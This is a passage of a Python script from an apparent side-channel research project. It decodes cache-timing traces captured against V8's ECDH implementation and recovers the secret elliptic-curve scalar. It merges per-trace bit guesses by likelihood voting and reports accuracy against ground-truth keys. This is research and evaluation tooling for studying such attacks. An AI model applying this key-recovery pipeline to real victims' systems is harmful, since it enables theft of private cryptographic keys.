    nruns = len(list(Path(directory).glob("r*.out")))
    if nruns == 0 or len(victim_data) % nruns:
        raise ValueError(
            f"{victim_file}: {len(victim_data)} timestamps is not a multiple "
            f"of {nruns} trace files"
        )
    nbits = len(victim_data) // nruns
    if nbits != expected_slots:
        raise ValueError(
            f"{victim_file}: {nbits} bits/run from {nruns} trace files, "
            f"expected {expected_slots}"
        )
    return [victim_data[i * nbits : (i + 1) * nbits] for i in range(nruns)]


def infer_all_traces_in_dir(
    ec_key, directory, use_cache=True, victim_slots=False, max_unknown_fraction=0.20
):
    dir_path = Path(directory)
    executor = ProcessPoolExecutor(max_workers=16)
    futures = []
    victim_runs = load_victim_runs(dir_path, ec_key.key_length) if victim_slots else None

    print(f"capture {dir_path}")
    segmentation = "oracle victim slots" if victim_slots else "DP loop anchor"
    print(f"  primitive fr, channels: col0 role '0', col1 role 'c' ({segmentation})")
    cache_status = "reuse" if use_cache else "recompute and overwrite"
    print(f"  secret scalar: {ec_key.key_length} bits (MSB-first), cache: {cache_status}\n")

    for filepath in dir_path.iterdir():
        if not filepath.is_file():
            continue
        if filepath.suffix != ".out":
            continue
        future = executor.submit(
            ec_key.infer_individual_with_cache, filepath, use_cache, victim_runs
        )
        futures.append(future)

    for future in as_completed(futures):
        fp, inferred_key = future.result()
        # if inferred_key == None:
        #     ec_key.broken_trace_cnt += 1
        #     continue
        # ec_key.inferred_keys.append(inferred_key)

        if debug_print:
            stats = None
            if inferred_key:
                stats = ec_key.inference_stats(inferred_key)
            print(fp, stats)
        # ec_key.analysis_stats.append(stats)

    if len(ec_key.analysis_stats) == 0:
        print("decoded 0 traces")
        return

    cor, inc, unk = zip(*ec_key.analysis_stats)
    trace_count = len(ec_key.inferred_keys)
    calibrated_known, calibrated_accuracy = ec_key.merge_inference(
        max_unknown_fraction=max_unknown_fraction
    )
    known, wrong, unknown = ec_key.inference_stats(ec_key.final_inference)
    known_total = known + wrong
    known_acc = known / known_total if known_total else 0.0
    per_trace_acc = np.array(
        [c / (c + i) if c + i else 0.0 for c, i in zip(cor, inc)]
    )

    print(f"decoded {trace_count} traces")
    print(
        "\nVOTE: leave-one-bit-out asymmetric trace likelihood "
        f"(unknown budget {max_unknown_fraction:.0%})"
    )
    print(
        f"  known  {known_total:3d} ({known_total / ec_key.key_length:.2%}) | "
        f"unknown  {unknown:3d} ({unknown / ec_key.key_length:.2%}) | "
        f"wrong  {wrong:3d} | known-acc {known_acc:.5f} | {trace_count} traces"
    )
    print(
        f"  calibrated LLR cutoff {ec_key.vote_llr_cutoff:.3f}: "
        f"{calibrated_known} kept, ground-truth known-acc {calibrated_accuracy:.5f}"
    )
    print(
        "  per-kept-trace acc: "
        f"mean {per_trace_acc.mean():.5f} min {per_trace_acc.min():.5f} "
        f"max {per_trace_acc.max():.5f}"
    )
    if ec_key.broken_trace_cnt.value:
        print(f"  dropped broken traces: {ec_key.broken_trace_cnt.value}")
    if ec_key.low_quality_trace_cnt.value:
        print(
            "  dropped low-contrast traces: "
            f"{ec_key.low_quality_trace_cnt.value} "
            "(fewer than 5% of one inferred bit value)"
        )

    print_scalar_comparison(ec_key.secret_key_bin, ec_key.final_inference)

    if victim_slots:
        score_futures = [
            executor.submit(ec_key.score_individual_with_cache, filepath, victim_runs)
            for filepath in dir_path.iterdir()
            if filepath.is_file() and filepath.suffix == ".out"
        ]
        for future in as_completed(score_futures):
            future.result()

        hist_inference, hist_stats = ec_key.vote_history()
        print(
            "\nVOTE: history-FIR (continuous marker-count score, "
            f"{hist_stats.get('folds', '?')} fold(s))"
        )
        if hist_stats["known"]:
            print(
                f"  known  {hist_stats['known']:3d} "
                f"({hist_stats['known'] / ec_key.key_length:.2%}) | "
                f"unknown  {hist_stats['unknown']:3d} "
                f"({hist_stats['unknown'] / ec_key.key_length:.2%}) | "
                f"wrong  {hist_stats['wrong']:3d} | "
                f"known-acc {hist_stats['known_acc']:.5f} | "
                f"{len(ec_key.scores)} traces"
            )
            print_scalar_comparison(ec_key.secret_key_bin, hist_inference)
        else:
            print("  no 0-cluster found -- cannot anchor the history model")


def infer_all_keys(all_keys_dir, use_cache=True):
    dir_path = Path(all_keys_dir)
    executor = ProcessPoolExecutor(max_workers=16)
    futures = []

    ec_keys = {}

    pattern = r"v8_ecdh_key_pool_key(\d+)+"
    for subdir in dir_path.iterdir():
        if not subdir.is_dir():
            continue
        matches = re.search(pattern, subdir.name)
        if matches:
            key_id = int(matches.group(1))
        else:
            continue

        if not key_id in ec_keys:
            ec_keys[key_id] = EC_KEY.load_ec_key(
                find_project_root()
                + f"/experiments/v8_ecdh/ec_key_pool/ec_key_{key_id}.json"
            )

        ec_key = ec_keys[key_id]
        for filepath in subdir.iterdir():
            if not filepath.is_file():
                continue
            if filepath.suffix != ".out":
                continue

            future = executor.submit(
                ec_key.infer_individual_with_cache, filepath, use_cache
            )
            futures.append(future)

    for future in as_completed(futures):
        fp, inferred_key = future.result()

    all_key_stats = []
    broken_trace_cnt = 0
    for ec_key in ec_keys.values():
        broken_trace_cnt += ec_key.broken_trace_cnt.value
        ec_key.merge_inference()
        c, i, u = ec_key.inference_stats(ec_key.final_inference)
        stat = (c, i, u / ec_key.key_length * 100)
        all_key_stats.append(stat)
        # print(stat)
        # for k in ec_key.inferred_keys:
        #     print(len(k))
        # print("")
        # print(ec_key.final_inference)
        # print(ec_key.secret_key_bin)
        # return

    cor, inc, unk = zip(*all_key_stats)
    print("Broken Trace Count:", broken_trace_cnt)
    print(
        f"Inferred median: {(100 - np.median(unk)):.2f}%, min: {100-max(unk)}%, max: {100-min(unk)}%",
    )

    print(f"Unknown median: {np.median(unk):.2f}%, min: {min(unk)}, max: {max(unk)}%%")
    accs = []
    for c, i in zip(cor, inc):
        accs.append(c / (c + i))
    print(
        f"Accuracy: median: {np.median(accs)*100:.2f}%, min: {min(accs)*100:.2f}%, max: {max(accs)*100:.2f}%"
    )
    return


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Extract secret key from on v8 ecdh trace"
    )

    parser.add_argument(
        "--at",
        choices=["FR", "PS", "PP"],
        default="FR",
        help="Attack Primitive: FR or PS (default: FR)",
    )

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument(
        "--all_keys",
        type=str,
        help="all keys",
    )

    group.add_argument(
        "-i",
        "--input_file",
        type=str,
        help="Input file",
    )

    group.add_argument(
        "-d",
        "--input_dir",
        type=str,
        help="Input dir",
    )

    parser.add_argument(
        "--debug",
        action="store_const",
        const=True,
        default=False,
        help="Debug print",
    )

    parser.add_argument(
        "--key_id",
        type=int,
        help="EC key ID",
    )

    parser.add_argument(
        "--overwrite-cache",
        action="store_true",
        help="Recompute every trace and replace its .inf cache entry",
    )

    parser.add_argument(
        "--victim-slots",
        action="store_true",
        help="Evaluation-only: segment P+P traces using sibling victim_bits.txt",
    )

    parser.add_argument(
        "--unknown-budget",
        type=float,
        default=0.20,
        help="Max fraction of bits merge_inference may leave unknown",
    )

    args = parser.parse_args()

    if args.debug:
        debug_print = True

    key_id = 0
    if args.key_id != None:
        key_id = int(args.key_id)
    if not args.all_keys:
        ec_key = EC_KEY.load_ec_key(
            find_project_root()
            + f"/experiments/v8_ecdh/ec_key_pool/ec_key_{key_id}.json"
        )

    if args.all_keys:
        if args.victim_slots:
            parser.error("--victim-slots currently supports -i or -d, not --all_keys")
        infer_all_keys(args.all_keys, not args.overwrite_cache)
    if args.input_dir:
        infer_all_traces_in_dir(
            ec_key,
            args.input_dir,
            not args.overwrite_cache,
            args.victim_slots,
            args.unknown_budget,
        )
    elif args.input_file:
        if args.victim_slots:
            victim_runs = load_victim_runs(
                Path(args.input_file).parent, ec_key.key_length
            )
            key = ec_key.infer_individual_with_cache(
                Path(args.input_file), not args.overwrite_cache, victim_runs
            )[1]
        else:
            key = ec_key.infer_individual(args.input_file)
        if key:
            correct, incorrect, unknown = ec_key.inference_stats(key)
            known = correct + incorrect
            known_accuracy = correct / known if known else 0.0
            print(f"decoded trace {args.input_file}")
            print(
                f"  correct {correct:3d} | wrong {incorrect:3d} | "
                f"unknown {unknown:3d} | known-acc {known_accuracy:.5f}"
            )
            print_scalar_comparison(ec_key.secret_key_bin, key)
